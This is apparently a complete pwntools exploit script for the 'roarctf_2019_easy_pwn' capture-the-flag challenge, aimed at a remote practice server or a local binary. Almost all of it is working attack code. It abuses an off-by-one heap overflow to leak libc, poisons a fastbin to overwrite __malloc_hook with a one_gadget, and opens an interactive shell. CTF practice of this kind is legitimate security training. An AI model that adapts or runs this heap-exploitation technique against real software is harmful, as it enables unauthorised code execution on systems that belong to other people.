from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './roarctf_2019_easy_pwn'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn', 27134) if argv[1]=='r' else process(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# start
def add(size):
	sla('choice: ','1')
	sla('size: ',str(size))

def delete(index):
	sla('choice: ','3')
	sla('index: ',str(index))

def edit(index,size,content):
	sla('choice: ','2')
	sla('index: ',str(index))
	sla('size: ',str(size))
	sla('content: ',content)

def show(index):
	sla('choice: ','4')
	sla('index: ',str(index))

add(0x58) # 0
for i in range(4):
	add(0x60) # 1
edit(0, 0x58+10, 'a'*0x58+'\xe1')
delete(1)
add(0x60) # 1
show(2) # 2
ru('content: ')
main_arena = uu64(r(6)) - 88
base = main_arena - libc.sym['__malloc_hook'] - 0x10
leak('base', base)

add(0x60) # 5 (2)
delete(2) # bypass fastbin check
edit(5,0x8,p64(main_arena-0x33)) # above malloc_hook
add(0x60) # 2
add(0x60) # 6
payload = flat('a'*0xb,base+0x4526a,base+libc.sym['realloc']+2)
edit(6,len(payload),payload)
add(0x18)
# end

itr()
